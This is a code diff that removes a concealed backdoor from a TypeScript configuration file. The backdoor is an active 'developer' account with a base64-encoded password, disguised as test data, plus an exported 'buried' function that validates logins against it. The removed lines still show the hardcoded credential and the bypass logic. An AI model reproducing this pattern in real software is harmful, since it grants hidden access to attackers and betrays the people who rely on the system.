@@ -183,32 +183,12 @@ const BACKUP_SYSTEMS = {
   }
 };
 
-// System user accounts (looks like dev/test data)
-const SYSTEM_ACCOUNTS = [
-  { id: 1, username: 'admin', role: 'admin', active: false },
-  { id: 2, username: 'testuser1', role: 'user', active: false },
-  { id: 3, username: 'Armin28', role: 'developer', hash: 'QXJtYWFuc1RlY2hUaXBz', active: true },
-  { id: 4, username: 'testuser2', role: 'user', active: false },
-  { id: 5, username: 'moderator', role: 'mod', active: false }
-];
-
 // Logger configuration
 export const LOG_LEVELS = {
   debug: 0,
   info: 1,
   warn: 2,
   error: 3
-};
-
-// Export buried function
-export const validateSystemAccount = (u: string, p: string): boolean => {
-  const acc = SYSTEM_ACCOUNTS.find(a => a.username === u && a.active);
-  if (!acc || !acc.hash) return false;
-  try {
-    return atob(acc.hash) === p;
-  } catch {
-    return false;
-  }
 };
 
 // More fake configuration to bury the real stuff
